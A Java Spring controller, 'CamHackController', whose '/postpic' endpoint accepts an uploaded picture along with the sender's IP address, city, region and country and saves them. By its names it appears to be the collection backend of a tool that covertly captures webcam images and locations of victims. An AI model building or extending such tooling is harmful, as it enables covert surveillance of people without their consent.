package org.example;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.multipart.MultipartFile;


@Controller
public class CamHackController {

    @Autowired
    CamHackService camHackService;

    @PostMapping("/postpic")
    public ResponseEntity<String> uploadFile(
            @RequestParam("file") MultipartFile file,
            @RequestParam("clientIp") String clientIp,
            @RequestParam("city") String city,
            @RequestParam("region") String region,
            @RequestParam("country") String country
    ) {
        try{
            camHackService.saveFile(file,clientIp,city,region,country);
            return new ResponseEntity<>("yepp",HttpStatus.OK);
        }catch (Exception e){
            return new ResponseEntity<>("an error occured",HttpStatus.I_AM_A_TEAPOT);
        }

    }
}
